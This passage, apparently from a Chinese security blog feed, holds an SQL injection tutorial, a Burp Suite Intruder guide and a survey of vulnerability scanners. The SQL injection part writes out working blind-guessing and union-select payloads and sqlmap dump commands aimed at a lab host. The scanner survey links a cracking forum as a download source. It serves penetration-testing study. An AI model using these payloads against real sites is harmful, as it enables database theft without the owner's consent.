<p>可在注入点提交如下语句查询：</p><p>and exists(select 字段名 from 数据库表名)     或者</p><p>and (select count(字段名) from 数据库表名 )&gt;=0</p><p>如果存在此字段名，返回页面正常，否则可更换字段名继续进行猜测。</p><p>猜解字段长度，可提交如下查询语句：</p><p>当提交 &gt;n-1 时正常，而提交 &gt;n 时返回错误，则说明字段长度为 n。</p><p>and (select top 1 len(字段名) from 数据库表名)&gt;1</p><p>…</p><p>and (select top 1 len(字段名) from 数据库表名)&gt;n-1</p><p>and (select top 1 len(字段名) from 数据库表名)&gt;n</p><p>当提交 &gt;n-1 时正常，而提交到 n 时返回错误，那么说明字段长度为 n。</p>        <h3 id="4-1-4-猜字段值">          <a href="#4-1-4-猜字段值" class="heading-link"><i class="fas fa-link"></i></a>4.1.4. 猜字段值</h3>      <p>猜字段的 ASCII 值，可在注入点后提交如下查询语句：</p><p>and (select top 1 asc(mid(字段名,1,1)) from 数据库表名)&gt;0</p><p>…</p><p>and (select top 1 asc(mid(字段名,1,1)) from 数据库表名)&gt;n-1</p><p>and (select top 1 asc(mid(字段名,1,1)) from 数据库表名)&gt;n</p><p>当提交 &gt;n-1 时正常，而提交 &gt;n 时返回出错，那么说明字段值的 ASCII 码为 n。反查 ASCII 码对应的字符，就可以得到字段值的第一位字符，要继续提交如下查询：</p><p>and (select top 1 asc(mid(字段名,2,1)) from 数据库表名)&gt;0</p><p>用上面同样的方法，可以得到第二位字符。在继续进行查询，直接猜解出字段的所有字符值为止。</p>        <h2 id="4-4-SQL-注入的高级查询">          <a href="#4-4-SQL-注入的高级查询" class="heading-link"><i class="fas fa-link"></i></a>4.4. SQL 注入的高级查询</h2>      <p>在上一节介绍的 ASCII 码猜解法很浪费时间，下面介绍一种高效的方法 order by 与 union select 联合查询，可以快速地获取字段长度和字段内容。这种查询方法，不仅可以利用在 Access 数据库猜解中，必须掌握的方法。同样可以适用于利用在其他类型的数据库的注入猜解中。</p>        <h3 id="4-4-1-order-by-猜字段数目">          <a href="#4-4-1-order-by-猜字段数目" class="heading-link"><i class="fas fa-link"></i></a>4.4.1. order by 猜字段数目</h3>      <p>首先，利用 order by 猜解字段数目，查询语句如下：</p><p>order by 1</p><p>order by 2</p><p>….</p><p>order by n-1</p><p>order by n</p><p>如果 n-1 时返回正常，n 时返回错误，那么说明数据库字段数目为 n-1。</p>        <h3 id="4-4-2-union-select-爆字段内容">          <a href="#4-4-2-union-select-爆字段内容" class="heading-link"><i class="fas fa-link"></i></a>4.4.2. union select 爆字段内容</h3>      <p>得到字段长度后，就可以利用 union select 查询获得字段内容了。</p><p>and 1=2 union select 1,2,3…,n from 表名</p><p>执行上面的查询时，在页面会返回数字，修改查询语句中的数字为字段名，例如提交如下代码：</p><p>and 1=2 union select 1,字段1,字段2…,n from 表名</p><p>在页面中就会返回字段内容，不必一个个进行猜解了。</p>        <h2 id="5-1-偏移注入">          <a href="#5-1-偏移注入" class="heading-link"><i class="fas fa-link"></i></a>5.1. 偏移注入</h2>      <p>偏移注入是针对 Access 数据库，当我们注入猜到数据库表名却猜不到列名 (字段名) 的情况下，这种方法就可以帮我填补。（注：这种方法运气很重要）</p>        <h2 id="5-2-跨库注入">          <a href="#5-2-跨库注入" class="heading-link"><i class="fas fa-link"></i></a>5.2. 跨库注入</h2>      <p>假设 a 和 b 两个站点在同一台服务器上，但是服务器上面安装了 安全狗，waf 这样的安全软件，现在我们要对 a 站点进行攻击，但是没有发现什么大漏洞，只找到网站数据库路径，对数据库下载发现下载不了。这个时候我发现 b 站点有注入点。直接用：</p><p><span class="exturl"><a class="exturl__link" href="http://192.168.133.133:83/new_view.asp?id=14">http://192.168.133.133:83/new_view.asp?id=14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,adminpassword,username,4,5,6,7 from [C:\wwwtest\2AspCMS_data\data.asp].Aspcms_Admins</p><p>[C:\wwwtest\2AspCMS_data\data.asp].Aspcms_Admin 是 b 站点的数据库路径</p>        <h1 id="三，注入之伪静态突破">          <a href="#三，注入之伪静态突破" class="heading-link"><i class="fas fa-link"></i></a>三，注入之伪静态突破</h1>      <p>phpstudy 配置伪静态</p>        <h1 id="四，sqlmap-自动化注入">          <a href="#四，sqlmap-自动化注入" class="heading-link"><i class="fas fa-link"></i></a>四，sqlmap 自动化注入</h1>              <h2 id="6-1-sqlmap-基本命令">          <a href="#6-1-sqlmap-基本命令" class="heading-link"><i class="fas fa-link"></i></a>6.1. sqlmap 基本命令</h2>      <p>#-u 目标网址<br>#–batch 自动化<br>#–dbs数据库<br>#–users 获取所有用户<br>#–current-db  当前数据库<br>#–current-user  当前用户<br>#-D 库名 –tables  指定库下面的表信息<br>#-T 表名 –columns 指定表下面的列信息(前面要有指定的库）<br>#-C 列名 指定列名下的数据<br>#–dump 把想要的down下来（在想要的库或表的后面添加的语句）</p><p>sqlmap.py -u “<span class="exturl"><a class="exturl__link" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> –batch –dbs –level 2</p><p>sqlmap.py -u “<span class="exturl"><a class="exturl__link" href="http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://192.168.133.133:81/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> –batch -D dvwa –tables</p><p>……</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描类 Burpsuite</title>
      <link href="2020/07/25/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B1%BB%20Burpsuite/"/>
      <url>2020/07/25/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B1%BB%20Burpsuite/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-1-功能介绍">          <a href="#1-1-功能介绍" class="heading-link"><i class="fas fa-link"></i></a>1.1. 功能介绍</h2>      <p>Burpsuite 是 Web 应用程序测试的最佳工具之一，其多种功能帮我们执行各种任务，请求的拦截和修改，扫描 Web 应用程序漏洞，以暴力破解登录表单，执行会话令牌等多种的随机性检查。</p><a id="more"></a><p>特征：先爬取再检测是否有漏洞</p>        <h2 id="1-2-部署指南">          <a href="#1-2-部署指南" class="heading-link"><i class="fas fa-link"></i></a>1.2. 部署指南</h2>      <p>Java 运行环境 + Burpsuite 安装包</p>        <h2 id="1-3-实战">          <a href="#1-3-实战" class="heading-link"><i class="fas fa-link"></i></a>1.3. 实战</h2>      <p>由于 Burpsuite 功能强大，各项参数复杂，下面我们只看重于软件的主要功能，</p>        <h3 id="1-3-1-New-Scan-新建扫描">          <a href="#1-3-1-New-Scan-新建扫描" class="heading-link"><i class="fas fa-link"></i></a>1.3.1. New Scan(新建扫描)</h3>      <ol><li><p>Scan details：扫描细节</p><p>scan type:crawl and audit(爬行并审计)</p><p>url to scan：<span class="exturl"><a class="exturl__link" href="https://www.oldboyedu.com/">https://www.oldboyedu.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>1）details scope configuration：详细的范围设置</p><p>included url prefixes：包含 url 前缀</p><p>exclude url prefixes：排除 url 前缀</p><p>2）use advanced scope control：高级范围设置</p><p>included urls：包含的网址</p><p>excluded urls：排除的网址</p><p>3）protocol：协议（any,https,http)</p></li><li><p>Scan configuration：扫描设置（参考默认配置）</p><p>new crawling/auditing：爬行/审计</p><p>1）crawl optimization：抓取优化（maximum link depth 最大链接深度，几级网站目录；crawl strategy 爬行策略，速度）</p><p>2）crawl limits：抓取限制（maximum crawl time 最大抓取时间，超过这个时间就会自动终止）</p><p>3）login functions：登录功能（attempt to self-register a user 尝试自行注册简单网址用户；trigger login ..(use invalid username) 登录失败，使用非法用户</p><p>4）handling application errors crawl：处理爬网期间的应用程序错误（连续错误超时，跳过该扫描）</p><p>5）miscellaneous：其他</p></li><li><p>application login：用户注册（有些网站扫描时要输入用户名和密码，用来扫后台的模块 label标签）</p></li><li><p>resource pool：资源池</p></li></ol>        <h3 id="1-3-2-New-live-task-实时任务">          <a href="#1-3-2-New-live-task-实时任务" class="heading-link"><i class="fas fa-link"></i></a>1.3.2. New live task(实时任务)</h3>      <p><strong>Scan details</strong></p><p>live audit:</p><ol><li>choose predefine task：自定义任务</li><li>passive scan through proxy：使用代理被动扫描</li><li>active scan through proxy：使用代理主动扫描</li></ol><p>url scope：网址范围</p><p>deduplication：重复排除</p><p><strong>Scan configuration：扫描设置</strong>（保持默认）</p><ol><li>audit optimization：审计优化</li><li>lssues reported：要报告的问题</li><li>handing application errors furing audit：在诊断期间处理应用错误</li><li>insertion point type：插入点类型</li><li>modifying parameter locations：操作参数位置</li><li>ignored insertion points：忽略插入点（可跳过的服务端插入的位置）</li><li>frequently occrurring insertion points：经常插入点</li><li>misc insertion point options：其他插入点</li><li>javascript analysis：js解析</li></ol>        <h3 id="1-3-3-Undock">          <a href="#1-3-3-Undock" class="heading-link"><i class="fas fa-link"></i></a>1.3.3. Undock</h3>      <p>可以单独把区域页面放大拿出来</p>        <h3 id="1-4-Target">          <a href="#1-4-Target" class="heading-link"><i class="fas fa-link"></i></a>1.4. Target</h3>      <ol><li><p>site map：显示扫描的结果</p></li><li><p>filter：筛选，剔除筛选标准</p></li><li><p>scope：范围</p><p>1）include in scope：包含的范围</p><p>2）exclude from scope：剔除的IP网址，有些企业会对扫描结果进行垃圾存储</p><p>3）issue definitions：问题定义，扫描的漏洞库</p></li></ol>        <h3 id="1-5-Proxy-代理">          <a href="#1-5-Proxy-代理" class="heading-link"><i class="fas fa-link"></i></a>1.5. Proxy(代理)</h3>      <p>相关参考：<span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/105151456">https://blog.csdn.net/weixin_45798017/article/details/105151456</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 或者 <span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/105255856">https://blog.csdn.net/weixin_45798017/article/details/105255856</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-6-Intruder-入侵">          <a href="#1-6-Intruder-入侵" class="heading-link"><i class="fas fa-link"></i></a>1.6. Intruder(入侵)</h3>      <ol><li><p>Target：代理拦截后会自动识别</p></li><li><p>Positions：</p><p>auto：有参数的地方自动添加变量</p><p>refresh：刷新</p></li><li><p>Payloads：定义参数值和类型</p><p>payload set：参数值</p><p>payload type：类型（可以是numbers，下面就有相关的设置）</p><p>payload 也可自定以添加（simple lists）</p><p>intruder-&gt;start attack(开始攻击)</p><p>当对一个参数进行暴力破解时，选用sniper；当有两个参数时，选择cluster bomb模式</p></li></ol>        <h4 id="1-6-1-Sniper">          <a href="#1-6-1-Sniper" class="heading-link"><i class="fas fa-link"></i></a>1.6.1 Sniper</h4>      <p>Sniper模式：使用单一的payload组，它会针对每个位置设置payload，使用于对请求参数单独进行Fuzzing测试的情形，攻击中请求总数是position数量和payload数量的乘积。</p>        <h4 id="1-6-2-Battering-ram">          <a href="#1-6-2-Battering-ram" class="heading-link"><i class="fas fa-link"></i></a>1.6.2 Battering ram</h4>      <p>使用单一的payload组，重复payload并一次性把所有相同的payload放入指定的位置中，适用于需要在请求中把相同的输入放到多个位置的情形，请求的总数是payload组中payload总数。</p>        <h4 id="1-6-3-Pitchfork">          <a href="#1-6-3-Pitchfork" class="heading-link"><i class="fas fa-link"></i></a>1.6.3 Pitchfork</h4>      <p>使用多个payload组，攻击会同步迭代所有的payload组，把payload放入每个定义的位置，适用于在不同位置中需要插入不同但相似输入的情况，请求的数量是最小的payload组中的payload数量。</p>        <h4 id="1-6-4-Cluster-bomb">          <a href="#1-6-4-Cluster-bomb" class="heading-link"><i class="fas fa-link"></i></a>1.6.4 Cluster bomb</h4>      <p>使用多个payload组，每个定义的位置中有不同的payload组，攻击会迭代每个payload组，每种payload组合都会被测试一遍，这种攻击适用于在每个位置需要不同且不相关或者未知输入攻击的情景，攻击总数是各个payload组中payload数量的乘积。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描技术</title>
      <link href="2020/07/19/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/"/>
      <url>2020/07/19/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="一，漏洞扫描技术">          <a href="#一，漏洞扫描技术" class="heading-link"><i class="fas fa-link"></i></a>一，漏洞扫描技术</h1>              <h2 id="1-1扫描原理">          <a href="#1-1扫描原理" class="heading-link"><i class="fas fa-link"></i></a>1.1扫描原理</h2>              <h3 id="1-1-1-Ping-检测">          <a href="#1-1-1-Ping-检测" class="heading-link"><i class="fas fa-link"></i></a>1.1.1. Ping 检测</h3>      <p>win+R -&gt; cmd -&gt; ping + 目标IP</p><p>当 ping 通目标 IP 后 返回 TTL值判断目标 IP 的操作系统</p><a id="more"></a><p>TTL=128：可能是 windows xp/2000/2003 系统</p><p>TTL=64：可能是 windows 7/2008/10 系统，Linux系统</p><p>TTL=255：可能是交换机，路由器设备</p>        <h3 id="1-1-2-端口扫描">          <a href="#1-1-2-端口扫描" class="heading-link"><i class="fas fa-link"></i></a>1.1.2. 端口扫描</h3>      <p>win+R -&gt; cmd -&gt; telnet + 目标IP + 目标端口号</p><p>注意：扫描器的运作是基于 TCP/IP 的，个人计算机，服务器主机或者防火墙和路由器都适用。扫描信息的来源基本都必须依赖于端口，即必须某端口对外开放，才可以以此判断主机上运行的操作系统，服务软件类型及版本等。例如：使用 ftp.exe 连接主机，判断主机 FTP 服务程序类型和版本，如果 FTP 服务对应的 21 端口无法访问，则得不到任何信息。</p>        <h2 id="1-2-扫描分类">          <a href="#1-2-扫描分类" class="heading-link"><i class="fas fa-link"></i></a>1.2. 扫描分类</h2>      <ol><li>开放扫描：</li><li>半开放扫描：</li><li>隐蔽扫描：</li><li>扫射扫描：</li><li>其他扫描：</li></ol>        <h2 id="1-3-扫描前准备">          <a href="#1-3-扫描前准备" class="heading-link"><i class="fas fa-link"></i></a>1.3.扫描前准备</h2>      <ol><li>了解网络的部署情况，企业的 需要/不需要/不能 扫描（有些扫描可能造成网络瘫痪）</li><li>扫描时间和方式（正常来说都是在凌晨，半夜进行扫描，这个时间段访问的用户比较少）</li><li>定制好扫描策略（针对于 漏洞/端口/弱口令/全部 扫描）</li><li>防火墙是否开启（防火墙开启的情况下，默认是扫描不到的）</li><li>企业服务是否配置了相关的安全策略，以访锁死（注意）（比如说：数据库设置3次密码，针对那些弱口令的暴力破解）</li></ol>        <h2 id="1-4-常见的扫描工具">          <a href="#1-4-常见的扫描工具" class="heading-link"><i class="fas fa-link"></i></a>1.4. 常见的扫描工具</h2>      <ol><li>SuperScan</li><li>Fluxay（流光）</li><li>X-Scan</li><li>MBSA</li><li>Wikto</li><li>NMAP</li><li>天镜（启明）</li><li>极光（绿盟）</li></ol><p>国外：Arachni（开源的，kali中自带），HP WebInspect，IBM AppScan，Acunetix WVS（AWVS），Nessus，Nexpose，Netspaker…</p><p>国内：绿盟科技，杭州安恒，知道创宇，启明星辰…</p>        <h2 id="1-5-X-scan-的简写使用">          <a href="#1-5-X-scan-的简写使用" class="heading-link"><i class="fas fa-link"></i></a>1.5. X-scan 的简写使用</h2>      <ol><li><p>设置—&gt;扫描参数</p><p>这里可以设置 扫描目标 IP 或者网段</p><p>或者把要扫描的目标网址或者IP放到记事本里，通过”从文件获取主机列表”进行扫描</p><p>1）全局设置</p><p>扫描模块：一般默认，但是想怎么扫就勾上要扫的模块</p><p>并发扫描：根据自己电脑性能来决定并发扫描数量</p><p>扫描报告：一般采用网页报告就是 HTML 格式的（选择扫描完自动生成扫描列表）</p><p>2）其他设置</p><p>跳过没有响应的主机：默认的一般是这个，扫描比较快（方式：ping/telent）</p><p>无条件扫描：不管主机是否禁止，这种扫描比较慢</p><p>3）插件设置</p><p>字典文件设置：默认字典都比较弱，可以自己编辑添加，这都在 dat 这个文件夹里</p></li><li><p>工具</p><p>物理地址查询：判断扫描的IP地址和你自己主机的关系</p><p>ARP query：扫描 Mac地址 和 IP地址</p><p>Whois：查询域名，在网站中用到</p><p>Trace roots：测试路由情况，most name 就是目标网站的IP（ping网站 就能得到）</p><p>Ping：和window自带的ping一样</p></li></ol>        <h2 id="1-6-AppScan">          <a href="#1-6-AppScan" class="heading-link"><i class="fas fa-link"></i></a>1.6. AppScan</h2>      <p><strong>功能介绍</strong></p><p>AppScan 是 web 应用程序渗透测试舞台上使用最广泛的工具之一，它是一个桌面应用程序，有助于专业安全人员进行 web 应用程序自动化脆弱性评估。</p><p>AppScan 其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan source edition ，到针对 web 应用程序的快速扫描的 AppScan standard edition 以及进行安全管理和汇总整合的 AppScan enteprise edition 等，我们经常说的只是桌面的 AppScan ，即 AppScan standard edition ，其安装在 window 操作系统下，可以对网站等 web应用程序进行自动化的应用安全扫描和测试。</p><p>它需要 微软 C++ 2017 和 微软 .NET Framework4 4.7.2 Full 框架（所以就下载到虚拟机里，但是虚拟机 win 下下载时也没单独下载这个框架）</p><p>下载路径：<span class="exturl"><a class="exturl__link" href="https://www.52pojie.cn/thread-1189130-1-1.html">https://www.52pojie.cn/thread-1189130-1-1.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-6-1-实例">          <a href="#1-6-1-实例" class="heading-link"><i class="fas fa-link"></i></a>1.6.1.实例</h3>      <p>打开phpstudy，开启一台机器作为站点</p><p>文件-&gt;新建-&gt;常规模块（一般来说的）</p><ol><li><p>AppScan（自动或手动）(一般常选)</p><p>外部设备/客户机（AppScan作为记录代理）</p></li><li><p>从该url 启动扫描：扫哪个就填哪个站点</p></li><li><p>仅扫描此目录中或目录下的链接：就是选中的站点</p><p>将所有路径作为区分大小写来处理：这个包括第三方目录（该域名下的调用的第三方地址）</p></li><li><p>有点的站点可能需要账户密码才能扫描。</p></li><li><p>测试策略：</p><p>可以直接用默认的 Default（缺省值）</p></li><li><p>如何启动：</p><p>全面自动：一般选用这个就行了，立即扫描</p><p>稍后自动：就是先爬取网站，到达一定时间然后再扫描。</p></li><li><p>保存：</p><p>是：就会新建文件，扫描的会话就会保存在这个文件里</p></li><li><p>配置：</p><p>显示了以上的配置</p><p>可以单独点开查看，有的可以导入/导出</p></li><li><p>报告：</p><p>模板：有好几种，根据不同要求选择</p></li></ol><p><strong>注意：</strong></p><p>有的时候AppScan 扫描一个网站会导致这个网站崩溃（例如：银行，内容比较多，扫描的时间就比较久），或者扫描的过程中遇到错误，自动暂停了；这时我们就可以选择保存，这样我们就可以在下次扫描时接着上一次扫描的位置接着扫描。</p><p><strong>缺点：</strong></p><p>软件比较大，占内存。同时，它扫描速度也比较慢。它在国内的扫描力度不行，但是通用漏洞扫描比较强大。</p>        <h2 id="1-7-AWVS">          <a href="#1-7-AWVS" class="heading-link"><i class="fas fa-link"></i></a>1.7. AWVS</h2>      <p><strong>功能介绍</strong></p><p>AWVS 是一个自动化的 web应用程序测试工具，通过检查可利用的漏洞，黑客可以审核 web 应用程序的安全性。</p>        <h3 id="1-7-1-Dashboard-仪表板">          <a href="#1-7-1-Dashboard-仪表板" class="heading-link"><i class="fas fa-link"></i></a>1.7.1. Dashboard 仪表板</h3>      <p>显示扫描的运行以及爬取状态，显示漏洞个数和级别</p>        <h3 id="1-7-2-Targets-添加扫描目标">          <a href="#1-7-2-Targets-添加扫描目标" class="heading-link"><i class="fas fa-link"></i></a>1.7.2. Targets 添加扫描目标</h3>      <ol><li><p>General</p><p>Address：添加扫描IP</p><p>Description：设置扫描描述。</p><p>site login：登录扫描，有些时候扫描要登录。</p><p>use pre-recorrded login sequence：以保存的形式进行扫描，就是在登录的时候，把扫描的请求构成一个文件进行添加。</p><p>AcuSensor：就是在扫描前对目标网站判断是 php,aspx,jsp，用于减少误报，如果要用这个功能，就要在线下载这个文件（一般来说，也是很少用这个功能的）。</p></li><li><p>Crawl </p><p>User Agent：使用的头，可以用于伪造 Firefox，Chrome 等（访问的头）。</p><p>Exclude Path：排除扫描的路径。</p><p>Import Files：可以导入上一次没有扫完但是保存下来的文件进行接着扫描。</p></li><li><p>HTTP</p><p>HTTP Authentication：HTTP认证，就是有些网站得要登录，否则爬取不了登录后的页面信息。</p><p>Client Certificate：客户端证书，特殊的网站需要证书，导入进来就行了。</p><p>Proxy Server：HTTP代理功能。</p></li><li><p>Advanced：高级功能(一般不做）</p><p>Technologies：检测相应的 asp,php..</p></li><li><p>Scan Type：扫描类型</p><p>默认情况下是进行全方位扫描</p></li><li><p>Report：生成报告（各类模板，但是都是英文的）</p></li><li><p>Schedule：可以保持不变（instant），也可以自己修改，可以在特定时间段反复扫描</p></li></ol>        <h3 id="1-7-3-Settings">          <a href="#1-7-3-Settings" class="heading-link"><i class="fas fa-link"></i></a>1.7.3. Settings</h3>      <ol><li>Notification Settings：设置邮件发送告知工作人员扫描完成。</li></ol>        <h2 id="1-8-HP-WebInspect">          <a href="#1-8-HP-WebInspect" class="heading-link"><i class="fas fa-link"></i></a>1.8. HP WebInspect</h2>      <p>HP WebInspect 是一款文件大，系统资源占用更大的扫描软件，在安装后会开机自启很多功能繁琐的进程和服务，所以尽量将其安装在虚拟机中，操作系统在 win7以上，确保其支持 .Net Framework 4.5x 和 SQL Server 2012，开启前还需运行 services.msc 工具检查 SQL 和 WebInspect 系列服务是否正确启动，以防扫描时出现致命的错误中断，10.30版本可能需要 VPN。</p><p>优点：扫描 出来的报告是最全的。</p>        <h3 id="1-8-1-实例">          <a href="#1-8-1-实例" class="heading-link"><i class="fas fa-link"></i></a>1.8.1. 实例</h3>      <ol><li><p>文件 -&gt; 新建</p></li><li><p>Start URL：输入要扫描的网站</p></li><li><p>点击右面的 verify：显示网站（确保网站可以访问）</p></li><li><p>next button=&gt;：下一步（返回了 start url 的页面）</p></li><li><p>Scan Type：扫描类型（就用默认的 standard 就好了）</p></li><li><p>Scan Method：扫描模型（Crawl and Audit：爬行和审计 都有）</p></li><li><p>Policy：standard 就好了（里面还有单独的选项，如 SQL 之类的）</p></li><li><p>Gudie Scan 页面=&gt;：下一步</p></li><li><p>Use a login macro for this site：登录扫描</p><p>create：创建，跳转页面后是一个录制的过程（右边红⚪）</p><p>stop：停止录制</p><p>上面的 play 是模拟登录，看是否有问题</p></li><li><p>紧接着后面的 =&gt; 进行下一步</p></li><li><p>Profiler：运行策略，保持默认就好了，setting 也保持默认 ✔</p></li><li><p>Configure Detailed Options：里面的就是默认选项</p></li><li><p>Validate Settings and Start Scan 页面：上面 Save ，保持策略，下次扫描可以直接导入这个扫描策略。</p></li><li><p>Start Scan：开始扫描</p></li><li><p>Reports：报告输出</p><p>Generate report-&gt;next-&gt;</p></li></ol><p>特点：一边扫描，一边爬取，而AppScan 是先爬取后扫描</p>        <h2 id="1-9-Netspaker">          <a href="#1-9-Netspaker" class="heading-link"><i class="fas fa-link"></i></a>1.9. Netspaker</h2>      <p>效果比 AWVS 差很多。</p>        <h2 id="1-10-WVSS">          <a href="#1-10-WVSS" class="heading-link"><i class="fas fa-link"></i></a>1.10. WVSS</h2>      <p>绿盟的安全系统（要钱，没有破解版的）</p>        <h2 id="1-11-安恒明鉴">          <a href="#1-11-安恒明鉴" class="heading-link"><i class="fas fa-link"></i></a>1.11. 安恒明鉴</h2>      <p>安恒的漏洞弱口令扫描工具（要钱，没破解版的）</p>        <h2 id="1-12-Nessus">          <a href="#1-12-Nessus" class="heading-link"><i class="fas fa-link"></i></a>1.12. Nessus</h2>              <h3 id="1-12-1-功能">          <a href="#1-12-1-功能" class="heading-link"><i class="fas fa-link"></i></a>1.12.1.功能</h3>      <ol><li><p>Scan</p><p>Advanced Scan：高级扫描(默认)</p></li><li><p>Policies</p><p>Setting Type：根据自己情况</p><p>Port Scanning：端口设置扫描；设置端口扫描是十分重要的，直接关系扫描结果的准确性，如果是 default 的话就是默认的端口，如果输入 1-65535 就是1-65535 的所有端口，这样耗时很长，建议新手用 default。</p><p>Plugins：插件项目，选择合适的插件，搜索 denial ，列出所有拒绝服务检测的插件，点击“ENABLE”，禁止 Nessus 使用这些插件扫描，因为这些插件扫描可能造成目标系统宕机，应该排除掉。（默认是开启状态的，绿色的；禁止后是DISABLED红色的，意思是这个插件不再使用）</p></li><li><p>Schedule：可以设置扫描时间进行计划任务</p></li><li><p>右上角 点-&gt;sign out：设置完要退出</p></li><li><p>再次登录账户密码，新建扫扫描就会发现可以使用刚才设置的了</p></li><li><p>Upload Target：可以导入一个包含所有 IP 的 txt 文件</p></li><li><p>Lanch：点击，可以进行漏洞扫描</p></li></ol><p>点击 scan1 可以得到扫描结果。</p>        <h3 id="1-12-2-实例">          <a href="#1-12-2-实例" class="heading-link"><i class="fas fa-link"></i></a>1.12.2. 实例</h3>      <p>步骤：</p><ol><li><p>Policies页面</p><p>先 Advance Scan 新建一个策略模板</p><p>General：策略名称，描述</p><p>Permission：选择 can use</p><p>后面的默认好了</p><p>Plugins：右上角搜索 denial，把得出的 disable掉</p><p>save 保存模板，这样策略模板就新建成功了。</p></li><li><p>My Scan页面</p><p>New Scan：右上角，新建扫描</p><p>Advance scan：默认扫描策略</p><p>/user Defined选择自定义添加的扫描策略</p><p>输入任务名称，扫描IP地址，点击save即可看到新增的扫描任务</p><p>launch：启动扫描任务，可看到任务正在running</p></li></ol>        <h2 id="1-13-Nexpose">          <a href="#1-13-Nexpose" class="heading-link"><i class="fas fa-link"></i></a>1.13. Nexpose</h2>      <p>VM 虚拟机 ova 版本下载地址：<span class="exturl"><a class="exturl__link" href="http://download2.rapid7.com/download/NeXpose-v4/NexposeVA.ova">http://download2.rapid7.com/download/NeXpose-v4/NexposeVA.ova</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 或者 <span class="exturl"><a class="exturl__link" href="http://www.rapid7.com/products/nexpose/download.jsp">http://www.rapid7.com/products/nexpose/download.jsp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>ova 版本的账户密码：nexpose</p><p>最大的优点：这个软件和 MSF 一起使用（它们是同一个公司出的）</p>        <h2 id="1-14-启明天镜（BS-版）">          <a href="#1-14-启明天镜（BS-版）" class="heading-link"><i class="fas fa-link"></i></a>1.14. 启明天镜（BS 版）</h2>      <p>天镜脆弱性扫描与管理系统</p><p>免费 3 个月的使用，还原虚拟机（或者修改日期）又可以免费使用。（但是没有找到资源）</p>        <h2 id="1-15-RSAS（绿盟）">          <a href="#1-15-RSAS（绿盟）" class="heading-link"><i class="fas fa-link"></i></a>1.15. RSAS（绿盟）</h2>      <p>系统和 Web 可以同时扫描。</p>        <h1 id="二，漏洞扫描评估方案讲解">          <a href="#二，漏洞扫描评估方案讲解" class="heading-link"><i class="fas fa-link"></i></a>二，漏洞扫描评估方案讲解</h1>              <h2 id="2-1-测试目的">          <a href="#2-1-测试目的" class="heading-link"><i class="fas fa-link"></i></a>2.1. 测试目的</h2>              <h3 id="2-1-1-测试目的">          <a href="#2-1-1-测试目的" class="heading-link"><i class="fas fa-link"></i></a>2.1.1. 测试目的</h3>      <p>通过了解各家厂商的设备性能和功能是否能够满足当前业务需要。</p>        <h3 id="2-1-2-测试对象">          <a href="#2-1-2-测试对象" class="heading-link"><i class="fas fa-link"></i></a>2.1.2. 测试对象</h3>      <ol><li>绿盟科技 Web 应用漏洞扫描系统</li><li>杭州安恒网站安全监测平台</li><li>知道创宇 WEBSOC 网站立体监控系统</li><li>启明星辰</li></ol>        <h3 id="2-1-3-测试内容">          <a href="#2-1-3-测试内容" class="heading-link"><i class="fas fa-link"></i></a>2.1.3. 测试内容</h3>      <ol><li>功能测试：包括扫描漏报测试，漏洞误报测试，页面发现测试，管理功能测试。</li><li>性能测试：包括扫描速度测试，平均速率测试，最大速率测试。</li><li>可靠性测试：包括断电恢复测试，断点续扫测试。</li></ol>        <h3 id="2-1-4-测试环境">          <a href="#2-1-4-测试环境" class="heading-link"><i class="fas fa-link"></i></a>2.1.4. 测试环境</h3>      <ol><li><p>网络拓扑</p></li><li><p>测试目标机构</p></li></ol>        <h2 id="2-2-测试案例">          <a href="#2-2-测试案例" class="heading-link"><i class="fas fa-link"></i></a>2.2. 测试案例</h2>      <p>首先要找那种漏洞多的网站进行测试</p>        <h3 id="2-2-1-扫描功能和相关性能测试">          <a href="#2-2-1-扫描功能和相关性能测试" class="heading-link"><i class="fas fa-link"></i></a>2.2.1. 扫描功能和相关性能测试</h3>      <ol><li>漏报数</li><li>误报数</li><li>页面发现数</li><li>扫描速率</li><li>平均速率</li><li>最大速率</li><li>…</li></ol>        <h3 id="2-2-2-管理功能测试">          <a href="#2-2-2-管理功能测试" 